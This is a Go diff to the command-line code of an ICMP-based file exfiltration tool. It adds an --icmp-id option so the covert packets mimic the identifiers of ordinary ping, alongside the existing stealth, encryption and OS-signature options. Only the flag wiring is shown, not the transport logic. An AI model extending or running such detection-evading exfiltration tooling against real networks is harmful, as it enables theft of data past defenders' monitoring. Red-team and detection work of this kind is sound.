@@ -255,6 +255,7 @@ for decryption to succeed.`,
 			pingInterval, _ := cmd.Flags().GetDuration("ping-interval")
 			noEncrypt, _ := cmd.Flags().GetBool("no-encrypt")
 			encodeOnly, _ := cmd.Flags().GetBool("encode")
+			icmpID, _ := cmd.Flags().GetString("icmp-id")
 			password, _ := cmd.Flags().GetString("password")
 
 			if noSignature || signature == "none" {
@@ -298,6 +299,7 @@ for decryption to succeed.`,
 				PingInterval: pingInterval,
 				NoEncrypt:    noEncrypt,
 				EncodeOnly:   encodeOnly,
+				ICMPIDMode:   icmpID,
 			})
 		},
 	}
@@ -316,6 +318,7 @@ for decryption to succeed.`,
 	cmd.Flags().Duration("ping-interval", time.Second, "interval between packets in a sequence (1s matches real ping default)")
 	cmd.Flags().Bool("no-encrypt", false, "disable encryption and send raw plaintext")
 	cmd.Flags().Bool("encode", false, "base64-encode without encrypting (no authentication, lower entropy than AES)")
+	cmd.Flags().String("icmp-id", "os", "ICMP identifier: \"os\" (default — PID on Linux, 1 on Windows), \"random\", or a 0-65535 value")
 	cmd.MarkFlagRequired("target")
 
 	return cmd
@@ -437,6 +440,7 @@ The receiver must run "listen" with the same --password to reassemble and decryp
 			noStealth, _ := cmd.Flags().GetBool("no-stealth")
 			noEncrypt, _ := cmd.Flags().GetBool("no-encrypt")
 			signature, _ := cmd.Flags().GetString("signature")
+			icmpID, _ := cmd.Flags().GetString("icmp-id")
 			password, _ := cmd.Flags().GetString("password")
 
 			if password != "" {
@@ -446,14 +450,15 @@ The receiver must run "listen" with the same --password to reassemble and decryp
 			}
 
 			return orch.Exfiltrate(cmd.Context(), &orchestrator.ExfilOptions{
-				Target:    target,
-				File:      file,
-				Method:    method,
-				Mode:      mode,
-				ChunkSize: chunkSize,
-				Stealth:   !noStealth,
-				Encrypt:   !noEncrypt,
-				Signature: signature,
+				Target:     target,
+				File:       file,
+				Method:     method,
+				Mode:       mode,
+				ChunkSize:  chunkSize,
+				Stealth:    !noStealth,
+				Encrypt:    !noEncrypt,
+				Signature:  signature,
+				ICMPIDMode: icmpID,
 			})
 		},
 	}
@@ -466,6 +471,7 @@ The receiver must run "listen" with the same --password to reassemble and decryp
 	cmd.Flags().Bool("no-stealth", false, "skip stealth techniques (faster but noisier)")
 	cmd.Flags().Bool("no-encrypt", false, "transmit plaintext without encryption")
 	cmd.Flags().String("signature", "linux", "OS signature for TTL and payload pattern (linux, windows, none)")
+	cmd.Flags().String("icmp-id", "os", "ICMP identifier: \"os\" (default — PID on Linux, 1 on Windows), \"random\", or a 0-65535 value")
 	cmd.MarkFlagRequired("target")
 	cmd.MarkFlagRequired("file")
 
